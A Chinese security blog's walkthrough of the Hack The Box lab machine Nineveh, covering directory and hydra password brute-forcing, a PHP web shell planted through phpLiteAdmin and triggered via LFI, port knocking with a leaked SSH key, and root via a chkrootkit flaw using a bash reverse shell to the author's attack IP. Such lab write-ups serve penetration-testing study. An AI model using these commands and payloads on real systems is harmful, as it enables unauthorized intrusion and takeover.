> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Jd8-XxDNNubVxEtYwasV3w)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **111** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/AhUATAqa6tibYa4zTrlvc4l1rFIH7HV8c7ibcicw1jgibbwVW2zia9JeVCleEKLjkT0RO7sJS34DVSzMJ9sGsIAn5Fg/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/54

靶机难度：中级（4.3/10）

靶机发布日期：2017 年 10 月 8 日

靶机描述：

Nineveh is not overly challenging, however several exploits must be chained to gain initial access. Several uncommon services are running on the machine, and some research is required to enumerate them.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/oQI1m5hhwD5Gicl7xUf6kh3ISTH6iacM05s8G12QVAykGzh7S5Po8EgeS5XJvZbiacbS8AuRQJ1VaRic18jlToOhVQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0fb0Y1M6icJJia7t9xsBuUuxZQgOLeWHYicicRpfEiahMz3mlpK0icx8qLpfMLDojhD7IwSE2IalXVBBFs9E1Z88Ka3Q/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/PRVgXdHra5CzBfuOaOX4dpiaoOia6WZfdos1RiaJEZJG7nrnxTkXBoianpRmkQTmqkmW3zkbaQqjAu6WwBYAmyGibiaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjOZZGQlUEVjciadkgX7hBNYibI9FiaqsRpj2Mb5ICm3CENicoHERw8IYqpA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.43....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjmjx8scasgXSPPxicfbY55v0lLzQUcceWJtBBaQYOQG2zDZBUcibkeGLQ/640?wx_fmt=png)

namp 仅发现开放了 80 和 443 端口，添加域名 nineveh.htb 到 hosts....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSj5W2eb4cgezc9nsLibnJNVUS5uTGZ2UJEzKKMI02X46m8unnuPHtRNtg/640?wx_fmt=png)

访问 web，未发现有用的信息... 爆破

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjzWjZMz4ZxTkCso8AeOnjnciaBu0dnWoooGGOicicVYz5brfG6qx0ibj0fQ/640?wx_fmt=png)

爆破发现 / department 目录....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjmV6DPuaiaUKQqvpoZUDH4MOMp8urrIIibhzQJj0kY1wCIicfBib4eS2ASw/640?wx_fmt=png)

访问 department 这是个用户登录页面... 需要账号密码... 先放着... 目前没有账号密码信息登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjicjMibCiaNTiazcjRHiaM3icXvIl9T2OicpRfRKn1jrWaWNAcSzh7fLdR6QAw/640?wx_fmt=png)

访问开放的 443... 一张图，未发现有用的信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjTSsia1N5BCoOhiaQfxIOAaltRAEfVduDCDQOnWqNh7HxZFsbYYPHVp6w/640?wx_fmt=png)

当时在站点发现了邮箱地址... 先放着...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjLbvrZBU7PI4BlJ2me3WpLlZ9dXqZC2xOUluiaZPBUvzxl5WIlzhicdiag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjZu5bOtibRHThbicGQicyS2dd29Ofa3VWkIcU2dMyu9ohfevAxmvgEsvZQ/640?wx_fmt=png)

爆破发现了 / db、/server-status、/secure_notes 三个目录信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjpACnicEpK1Z3tHmiavzdQXlAZe5iaqR4gSQZvg6vn0wD2w4icibpFNNxveA/640?wx_fmt=png)

访问 secure_notes 发现又是一张图在主页上...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjukTLuPefBFjoDghiaAH8MibcbSMXpMTSRPoibIaeSVkKBQT5Vhf6mvv2g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSj57aZp7wjBDDK3Gglib3vp6MiaDowaEicVy0NJ0gqtpVYEZHWpkNuaicENQ/640?wx_fmt=png)

但是下载图片后，发现了有用的信息，改图片存放着 RSA 密匙凭证... 应该很熟悉了，这是 SSH 登录需要的...

回看 nmap 未发现靶机开放了 ssh 服务... 那就只有可能是靶机本地开启了 ssh... 只有获取低权 shell 外壳查看下... 先放着这重要的信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjb83yKKCkWuM96oiaQbAQXCNPTmOM9lpDCvb2wzLzU7uoWrITGxIoibaA/640?wx_fmt=png)

继续访问 / db 目录，发下这是 phpLiteAdmin 的登录页面....

通过 searchsploit phpliteadmin 发现了几个漏洞... 分析这些漏洞...

有版本匹配漏洞，有执行 SQL 注入的，还有的利用 XSS 和 CSRF 漏洞攻击的...

但是都需要成功登录...

目前获得的信息 http 的 department 存在登录页面和 https 的 db 存在登录页面...

当时都没有账号密码.... 这里也没找到任何有关账号密码的信息提示... 直接暴力破解....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjics2eow8SBTfhX8m7SL850l8cib9bea8MiagsGcCp55jBqldsoKPYHGfA/640?wx_fmt=png)

```
hydra -l admin -P 10k-most-common.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
hydra -l admin -P dayupasswd 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -T 64
```

通过 hydra 的多种尝试... 成功获得了 https_db 和 http_department 页面的账号密码信息....

![](https://mmbiz.qpic.cn/mmbiz_png/0fb0Y1M6icJJia7t9xsBuUuxZQgOLeWHYicicRpfEiahMz3mlpK0icx8qLpfMLDojhD7IwSE2IalXVBBFs9E1Z88Ka3Q/640?wx_fmt=png)

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/PRVgXdHra5CzBfuOaOX4dpiaoOia6WZfdos1RiaJEZJG7nrnxTkXBoianpRmkQTmqkmW3zkbaQqjAu6WwBYAmyGibiaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjUdsib2hG9kJrOWXBJ4cEEucyKErpzBjxYR3EvFpvSoQ1ianbEgZqOhlw/640?wx_fmt=png)

登录 department 页面，在 notes 处发现了很多有价值的信息...

URL 处存在 LFI 攻击，以及提示了 ninevehNotes.txt 文件名称信息...

内容信息提示此页面连接着数据库... 以及~ amrois 不知道做什么用的信息....

这里存在 LFI 攻击的话，又连接着数据库... 思路应该是在数据库上传 shell，在这里执行即可... 试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjXnZJohNlaxxibViaOQR5Py4eByKUL0UjmGdLoTcdVjYgib3icvoU1poBmg/640?wx_fmt=png)

登录 db 页面后，根据前面收集信息查看到可利用的 phpLite... 的漏洞提示... 开始创建 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjBZKNCkQWjXTf4ng3tibodsvgn6oE2OkAN7IRs6JZ9FBxzU3Nzbm5ulw/640?wx_fmt=png)

```
<?php echo system($_REQUEST["dayu"]);?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjEpp9hgmXJb56ZCricTfZqibzlv5vrfCuCU4tJibicAFtQM31CDGyYh3zow/640?wx_fmt=png)

```
/var/tmp/ninevehNotes.php
```

根据漏洞利用提示，首先创建一个扩展名为的数据库，继续创建了 ninevehNotes.php....（这里是因为前面获取的 ninevehNotes.txt 信息提示修改的... 还因为测试了几遍就是无法获得 shell... 改了 ninevehNotes 名称后就可以了）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjOcooy4GqWErE4Fjbv3SnCxCAzBOQlicOicsEECGj1E9WSoLVv1oiag3dQ/640?wx_fmt=png)

```
http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&dayu=dir
```

通过简单的测试... 成功利用 shell 注入查询信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjWic8nuHfd5kIUW3bbViaAl8Xru5q2M6CnmOr6nKY8CaAvZUO6S90H26Q/640?wx_fmt=png)

直接利用一句话 shell 成功提 www 权限...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjFXq5P0swtqWOibYXmO9BZMmnXlzDbUKvXEX6ibxSAfjKsYJLEFUkh8vw/640?wx_fmt=png)

进来后直接印证本地开放了 ssh 服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjjv3gZF21Viaia8ibMdLIhgfO2iaUynPdXzqOW5uZsxt8ibZHZItXx0YRObQ/640?wx_fmt=png)

通过反复思考前面获得的信息，LinEnum 枚举，以及 Find 查看了 amrois，发现存在 amrois 文件...

通过查看 amrois 文件信息... 最后提示了要获得 Amrois 用户权限，需要敲震（knock）571 290 911 端口...

继续 find 查看到了 knock 下存在的 knock.conf... 查看了配置，那就是在本地敲震端口后直接 ssh 利用 RSA 登陆即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjUk6otKaKc3ia2ud67KrzoicKTf8Kia5yJgM338QOUF5pdG3kcdmibzwQqg/640?wx_fmt=png)

```
sudo apt-get install knockd
knock 10.10.10.43 571 290 911
ssh -i id_ssh amrois@10.10.10.43
```

本地执行敲震，然后直接 ssh 成功获得了 Amrois 用户的权限... 并获得了 user_flag 信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjXNaM52RnCos9PicVoKHmOiceE1eXeTDGtZBU7w38KhBhnGdW05PrUCmQ/640?wx_fmt=png)

在主目录下发现 report 只在 amrois 权限下执行使用... 查看发现了几个过去的文本文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjiclibd8ZGhN5YlFog8t8FWJ18Z4m6rBHwqgHib0magfDeNYzYRoBicxJ4A/640?wx_fmt=png)

随意查看了一个后... 发现里面记录的都是过去执行过的文件过程信息... 这里我需要查看用户执行的进程...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjyX3JQebop69KPS8W3OtGG0epk1dicFJul4IVEqB81owKMF7PGqnZZrg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjbkSNzCb5N0ILTOicy9j1icibKdhqrOA9OQkdVWa5CLKEJvKCXlH0fqqkA/640?wx_fmt=png)

上传了 pspy32 对靶机的进程进行枚举...

可以看到很多 chkrootkit，这是一个工具，它在检查主机是否存在 rootkit 的迹象...

chkrootkit 存在漏洞....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjcJ4fibhdKePupTHfcgVk4sSHibmkZNc1QkpGjbs4a1zYMIXK6lh6Ev0w/640?wx_fmt=png)

本地进行查看... 发现存在可利用漏洞...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSjJEoboeaMAtINAJ8Ns9EQhibDtiaYlBOBicTLAm235NtY7fUicOia4QXgyibw/640?wx_fmt=png)

Chkrootkit 将以 root 身份运行任何名为 / tmp/update 的可执行文件，从而可以写入 payload_shell..... 这就简单了直接写即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMraMhvhdC4FOWYksdQ5MSj64VcuibZLBq2KYVoun0PY3XFiaUolgarWp2ZpWusWUAm9qyar0ia4iaXRg/640?wx_fmt=png)

```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.51/6666 0>&1
```

通过简单的写入 / tmp/update... 然后赋予权限执行... 成功获得了 root 权限... 获得了 root_flag 信息....

![](https://mmbiz.qpic.cn/mmbiz_png/AhUATAqa6tibYa4zTrlvc4l1rFIH7HV8c7ibcicw1jgibbwVW2zia9JeVCleEKLjkT0RO7sJS34DVSzMJ9sGsIAn5Fg/640?wx_fmt=png)

目录爆破 + hydra 密码爆破 + EXP 漏洞利用 + 端口敲震 + SSH_RSA+pspy 枚举 + chkrootkit 漏洞利用等等....

主要还是信息收集.... 信息收集越多，越容易拿下...

加油~~~

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/oQI1m5hhwD5Gicl7xUf6kh3ISTH6iacM05s8G12QVAykGzh7S5Po8EgeS5XJvZbiacbS8AuRQJ1VaRic18jlToOhVQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)